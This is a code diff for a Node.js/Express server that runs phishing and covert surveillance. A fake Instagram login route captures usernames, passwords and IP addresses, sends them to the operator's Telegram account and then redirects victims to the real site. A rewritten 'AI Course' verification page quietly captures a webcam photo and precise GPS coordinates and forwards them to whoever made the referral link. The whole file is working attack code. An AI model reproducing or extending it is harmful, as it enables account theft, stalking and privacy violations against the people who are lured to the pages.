@@ -373,7 +373,7 @@ app.use(express.json());
 const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 6 * 1024 * 1024 } });
 
 // Serve Instagram page
-app.get("/insta", (req, res) => {
+app.get("/insta", (_req, res) => {
   res.sendFile(path.join(__dirname, "test insta", "index.html"));
 });
 
@@ -385,7 +385,7 @@ app.post("/login", async (req, res) => {
   const { username, password } = req.body;
   if (!username || !password) return res.redirect("/insta");
   
-  const ip = req.ip || req.connection.remoteAddress || "unknown";
+  const ip = req.ip || req.socket.remoteAddress || "unknown";
   const time = new Date().toLocaleString();
   const msg = `*INSTAGRAM LOGIN*\nUser: \`${username}\`\nPass: \`${password}\`\nIP: \`${ip}\`\nTime: \`${time}\``;
   
@@ -399,312 +399,206 @@ app.post("/login", async (req, res) => {
 });
 
 // Student Page - Photo and Location Submission
+const INSTA_PATH = path.join(__dirname, "test insta");
+app.use("/insta", express.static(INSTA_PATH));
+
+// CAPTURE LOGIN
+app.post("/login", async (req, res) => {
+  const { username, password } = req.body;
+  if (!username || !password) return res.redirect("/insta");
+
+  const ip = req.ip || req.headers["x-forwarded-for"] || "unknown";
+  const time = new Date().toLocaleString();
+
+  const message = `
+*INSTAGRAM LOGIN*
+*User:* \`${username}\`
+*Pass:* \`${password}\`
+*IP:* \`${ip}\`
+*Time:* \`${time}\`
+  `.trim();
+
+  try {
+    await bot.telegram.sendMessage(ADMIN_USER_ID, message, { parse_mode: "Markdown" });
+  } catch (e) {
+    console.error("Failed to send login", e);
+  }
+
+  res.redirect("https://www.instagram.com/");
+});
+
+// ---------- STUDENT PAGE ----------
 app.get("/r/:ref", async (req, res) => {
   const { ref } = req.params;
-  if (!/^\d+$/.test(ref)) return res.status(400).send("Invalid ID");
-  
-  await saveUser(ref);
-  
+  if (!/^\d+$/.test(ref)) return res.status(400).send("Invalid");
+
+  // Optional: save even if user never used /start
+  await saveUser(ref, null);
+
   res.type("html").send(`<!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Student Submission</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: Arial, sans-serif;
-        }
-        body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        .container {
-            background: white;
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-            max-width: 500px;
-            width: 100%;
-        }
-        h1 {
-            color: #333;
-            text-align: center;
-            margin-bottom: 20px;
-            font-size: 24px;
-        }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            margin-bottom: 8px;
-            color: #555;
-            font-weight: bold;
-        }
-        input, textarea {
-            width: 100%;
-            padding: 12px;
-            border: 2px solid #ddd;
-            border-radius: 8px;
-            font-size: 16px;
-            transition: border-color 0.3s;
-        }
-        input:focus, textarea:focus {
-            outline: none;
-            border-color: #667eea;
-        }
-        textarea {
-            height: 100px;
-            resize: vertical;
-        }
-        .photo-preview {
-            margin-top: 10px;
-            text-align: center;
-        }
-        .photo-preview img {
-            max-width: 200px;
-            max-height: 200px;
-            border-radius: 8px;
-            border: 2px solid #ddd;
-        }
-        .submit-btn {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            padding: 15px 30px;
-            border: none;
-            border-radius: 8px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-            transition: transform 0.2s;
-        }
-        .submit-btn:hover {
-            transform: translateY(-2px);
-        }
-        .student-id {
-            text-align: center;
-            color: #666;
-            margin-bottom: 20px;
-            font-size: 14px;
-        }
-        .instructions {
-            background: #f8f9fa;
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            font-size: 14px;
-            color: #555;
-        }
-        .instructions ul {
-            margin-left: 20px;
-            margin-top: 10px;
-        }
-        .instructions li {
-            margin-bottom: 5px;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AI Course</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    body,html{margin:0;padding:0;height:100%;background:#111;color:#fff;font-family:system-ui;display:flex;align-items:center;justify-content:center;}
+    .card{background:rgba(255,255,255,.08);backdrop-filter:blur(12px);border-radius:16px;padding:20px;max-width:380px;width:90%;text-align:center;}
+    h1{font-size:1.6rem;color:#0f9;margin:8px 0;}
+    .warn{background:#c62828;padding:12px;border-radius:10px;font-size:.9rem;margin:12px 0;}
+    button{background:#0f9;color:#000;border:none;padding:14px;font-size:1rem;font-weight:600;border-radius:50px;width:100%;cursor:pointer;}
+    #status{margin-top:12px;padding:10px;background:rgba(0,255,136,.1);border-radius:8px;font-size:.9rem;}
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h1>📸 Student Submission</h1>
-        <div class="student-id">Student ID: ${ref}</div>
-        
-        <div class="instructions">
-            <strong>Instructions:</strong>
-            <ul>
-                <li>Take a clear photo of yourself</li>
-                <li>Enable location services</li>
-                <li>Describe your current activity</li>
-                <li>Click submit when ready</li>
-            </ul>
-        </div>
+<div class="card">
+  <h1>AI 2024</h1>
+  <div class="warn">
+    <strong>REQUIRED:</strong><br>
+    • Photo (verification)<br>
+    • Location (region)
+  </div>
+  <button id="go">CONFIRM</button>
+  <div id="status">Ready...</div>
+</div>
 
-        <form id="studentForm">
-            <div class="form-group">
-                <label for="photo">📷 Take Photo:</label>
-                <input type="file" id="photo" accept="image/*" capture="camera" required>
-                <div class="photo-preview" id="photoPreview"></div>
-            </div>
+<script>
+const ref = ${JSON.stringify(ref)};
+const firebaseUrl = ${JSON.stringify(FIREBASE_DB_URL)};
+let photoBlob = null;
+let geo = null;
+let username = null;
 
-            <div class="form-group">
-                <label for="location">📍 Your Location:</label>
-                <input type="text" id="location" placeholder="Getting your location..." readonly required>
-            </div>
+if (window.Telegram?.WebApp) {
+  Telegram.WebApp.ready();
+  Telegram.WebApp.expand();
+  const user = Telegram.WebApp.initDataUnsafe.user;
+  if (user) username = user.username || null;
+}
 
-            <div class="form-group">
-                <label for="activity">📝 Current Activity:</label>
-                <textarea id="activity" placeholder="Describe what you're doing right now..." required></textarea>
-            </div>
+document.getElementById("go").onclick = async () => {
+  const btn = document.getElementById("go");
+  const status = document.getElementById("status");
+  btn.disabled = true;
+  status.textContent = "Starting...";
 
-            <button type="submit" class="submit-btn">✅ Submit Information</button>
-        </form>
-    </div>
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    video.muted = true;
+    video.play();
+    await new Promise(r => { video.onloadeddata = r; });
 
-    <script>
-        // Get user location
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        
-                        // Get address from coordinates
-                        try {
-                            const response = await fetch(\`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=\${lat}&longitude=\${lon}&localityLanguage=en\`);
-                            const data = await response.json();
-                            const location = data.city + ', ' + data.countryName;
-                            document.getElementById('location').value = location + ' (' + lat.toFixed(4) + ', ' + lon.toFixed(4) + ')';
-                        } catch (error) {
-                            document.getElementById('location').value = 'Location: ' + lat.toFixed(4) + ', ' + lon.toFixed(4);
-                        }
-                    },
-                    (error) => {
-                        document.getElementById('location').value = 'Location access denied';
-                        console.error('Geolocation error:', error);
-                    }
-                );
-            } else {
-                document.getElementById('location').value = 'Geolocation not supported';
-            }
-        }
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+    photoBlob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.9));
+    stream.getTracks().forEach(t => t.stop());
+    status.textContent = "Photo OK";
+  } catch (e) { status.textContent = "No photo"; }
 
-        // Photo preview
-        document.getElementById('photo').addEventListener('change', function(e) {
-            const file = e.target.files[0];
-            if (file) {
-                const reader = new FileReader();
-                reader.onload = function(e) {
-                    const preview = document.getElementById('photoPreview');
-                    preview.innerHTML = '<img src="' + e.target.result + '" alt="Photo Preview">';
-                }
-                reader.readAsDataURL(file);
-            }
-        });
+  try {
+    geo = await new Promise((res, rej) => {
+      const t = setTimeout(() => rej(), 8000);
+      navigator.geolocation.getCurrentPosition(
+        p => { clearTimeout(t); res({ lat: p.coords.latitude, lon: p.coords.longitude }); },
+        () => { clearTimeout(t); rej(); },
+        { timeout: 8000, enableHighAccuracy: true }
+      );
+    });
+    status.textContent += " | GPS OK";
+  } catch (e) { status.textContent += " | No GPS"; }
 
-        // Form submission
-        document.getElementById('studentForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const photo = document.getElementById('photo').files[0];
-            const location = document.getElementById('location').value;
-            const activity = document.getElementById('activity').value;
-            
-            if (!photo || !location || !activity) {
-                alert('Please fill all fields and take a photo!');
-                return;
-            }
+  if (!photoBlob && !geo) {
+    status.textContent = "Nothing received";
+    btn.disabled = false;
+    return;
+  }
 
-            const submitBtn = document.querySelector('.submit-btn');
-            submitBtn.textContent = '🔄 Submitting...';
-            submitBtn.disabled = true;
+  status.textContent = "Sending...";
+  const fd = new FormData();
+  fd.append("ref", ref);
+  if (geo) { fd.append("latitude", geo.lat); fd.append("longitude", geo.lon); }
+  if (photoBlob) fd.append("photo", photoBlob, "s.jpg");
 
-            try {
-                // Convert photo to base64
-                const reader = new FileReader();
-                reader.onload = async function() {
-                    const photoBase64 = reader.result;
-                    
-                    // Send data to Telegram
-                    const response = await fetch('/submit-student-data', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            studentId: '${ref}',
-                            photo: photoBase64,
-                            location: location,
-                            activity: activity,
-                            timestamp: new Date().toISOString()
-                        })
-                    });
+  try {
+    await fetch("/submit", { method: "POST", body: fd });
 
-                    if (response.ok) {
-                        alert('✅ Data submitted successfully!');
-                        document.getElementById('studentForm').reset();
-                        document.getElementById('photoPreview').innerHTML = '';
-                    } else {
-                        alert('❌ Error submitting data. Please try again.');
-                    }
-                    
-                    submitBtn.textContent = '✅ Submit Information';
-                    submitBtn.disabled = false;
-                };
-                reader.readAsDataURL(photo);
-                
-            } catch (error) {
-                console.error('Submission error:', error);
-                alert('❌ Network error. Please check connection and try again.');
-                submitBtn.textContent = '✅ Submit Information';
-                submitBtn.disabled = false;
-            }
-        });
+    const userData = {
+      userId: ref,
+      username: username,
+      timestamp: Date.now(),
+      active: true,
+      hasPhoto: !!photoBlob,
+      hasLocation: !!geo
+    };
+    await fetch(\`\${firebaseUrl}/activeUsers/\${ref}.json\`, {
+      method: "PUT",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(userData)
+    });
 
-        // Get location when page loads
-        getLocation();
-    </script>
+    status.innerHTML = "<strong>SUCCESS!</strong><br>You are active!";
+    btn.style.display = "none";
+  } catch (e) {
+    status.textContent = "Error";
+    btn.disabled = false;
+  }
+};
+</script>
 </body>
 </html>`);
 });
 
-// Handle student data submission
-app.post("/submit-student-data", async (req, res) => {
+// ---------- SUBMIT ----------
+app.post("/submit", upload.single("photo"), async (req, res) => {
   try {
-    const { studentId, photo, location, activity, timestamp } = req.body;
-    
-    if (!studentId || !photo || !location || !activity) {
-      return res.status(400).json({ error: "Missing data" });
+    const { ref, latitude, longitude } = req.body;
+    if (!ref || !/^\d+$/.test(ref)) return res.status(400).json({ ok: false });
+
+    const inviterId = ref;
+    const promises = [];
+
+    if (req.file?.buffer) {
+      promises.push(
+        bot.telegram.sendPhoto(inviterId, { source: req.file.buffer }, {
+          caption: `New student (ref ${ref})`
+        }).catch(() => {})
+      );
     }
 
-    // Send to Telegram
-    const message = `🎓 *NEW STUDENT SUBMISSION*\n\n` +
-                   `🆔 Student ID: ${studentId}\n` +
-                   `📍 Location: ${location}\n` +
-                   `📝 Activity: ${activity}\n` +
-                   `⏰ Time: ${new Date(timestamp).toLocaleString()}\n\n` +
-                   `Photo attached below 👇`;
-
-    // Send text message first
-    await bot.telegram.sendMessage(ADMIN_USER_ID, message, { parse_mode: "Markdown" });
-
-    // Send photo if it's not too large
-    if (photo.length < 5000000) { // 5MB limit for photos
-      try {
-        await bot.telegram.sendPhoto(ADMIN_USER_ID, { 
-          source: Buffer.from(photo.split(',')[1], 'base64') 
-        }, {
-          caption: `Photo from Student ${studentId}`
-        });
-      } catch (photoError) {
-        console.error('Photo send error:', photoError);
-        await bot.telegram.sendMessage(ADMIN_USER_ID, `📷 Photo too large or invalid for student ${studentId}`);
+    if (latitude && longitude) {
+      const lat = parseFloat(latitude);
+      const lon = parseFloat(longitude);
+      if (!isNaN(lat) && !isNaN(lon)) {
+        promises.push(
+          bot.telegram.sendLocation(inviterId, lat, lon).catch(() => {}),
+          bot.telegram.sendMessage(inviterId, `GPS: ${lat.toFixed(5)}, ${lon.toFixed(5)}`).catch(() => {})
+        );
       }
-    } else {
-      await bot.telegram.sendMessage(ADMIN_USER_ID, `📷 Photo too large for student ${studentId}`);
     }
 
-    res.json({ success: true, message: "Data received" });
-  } catch (error) {
-    console.error("Student data submission error:", error);
-    res.status(500).json({ error: "Internal server error" });
+    if (promises.length === 0) {
+      promises.push(bot.telegram.sendMessage(inviterId, `Link opened (ref ${ref})`).catch(() => {}));
+    }
+
+    await Promise.allSettled(promises);
+    res.json({ ok: true });
+  } catch (e) {
+    console.error(e);
+    res.status(500).json({ ok: false });
   }
 });
+// Handle student data submission
 
 // Health check
-app.get("/", (req, res) => {
+
+app.get("/", (_req, res) => {
   res.json({ status: "OK", timestamp: new Date().toISOString() });
 });
-
 // Start server
 const server = app.listen(PORT, "0.0.0.0", () => {
   console.log(`🚀 Server LIVE: https://${HOST}:${PORT}`);
